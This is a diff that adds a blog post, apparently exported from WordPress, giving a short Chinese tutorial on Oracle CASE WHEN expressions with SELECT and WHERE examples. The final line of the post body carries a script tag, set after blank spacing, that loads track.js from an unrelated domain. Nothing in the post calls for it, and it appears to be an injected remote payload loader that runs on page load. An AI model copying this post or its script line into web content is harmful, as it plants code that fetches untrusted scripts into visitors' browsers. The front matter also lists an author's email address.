@@ -1,0 +1,44 @@
+---
+layout: post
+title: case when 在oracle中的运用
+date: 2019-11-14 11:50:58.000000000 +08:00
+type: post
+parent_id: '0'
+published: true
+password: ''
+status: publish
+categories:
+- Oracle
+tags: []
+meta:
+  blocksy_post_meta_options: a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}
+author:
+  login: gavin
+  email: 519077334@qq.com
+  display_name: gavin
+  first_name: ''
+  last_name: ''
+permalink: "/index.php/2019/11/14/case-when-%e5%9c%a8oracle%e4%b8%ad%e7%9a%84%e8%bf%90%e7%94%a8/"
+---
+<p>case when的语法</p>
+<p><strong>case when 表达式是一个通用条件的表达式，可以在表达式有效的任何位置使用。</strong></p>
+<p>CASE<br />
+WHEN &lt;A&gt; THEN &lt;somethingA&gt;<br />
+WHEN &lt;B&gt; THEN<br />
+&lt;somethingB&gt;<br />
+ELSE<br />
+&lt;somethingE&gt;<br />
+END</p>
+<p>1、case when 用在select语句中</p>
+<p>SELECT a, CASE WHEN a=1 THEN 'one'<br />
+WHEN a=2 THEN 'two'<br />
+ELSE 'other' END<br />
+FROM test;</p>
+<p>2、case when 用在where语句中</p>
+<p>SELECT  * FROM  tbname t WHERE  1=1<br />
+AND  (CASE  WHEN  t.vc_state = '2'  THEN  t.vc_userId ELSE  当前登录人id END  ) = 当前登录人id</p>
+<p>注意<br />
+1.result表示关联条件为真时返回的值，所以无论有多少个when子句，其result都必须的同一个类型的值，因为一个关系型数据库字段只能有一种类型（含括else可能返回的结果）<br />
+2.condition “如果为false，则以相同的方式评估后续where子句”即如果为真，就按照这种方式返回结果result，相当于是有先后顺序的</p>
+<p>&nbsp;</p>
+<p>&nbsp;<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script></p>
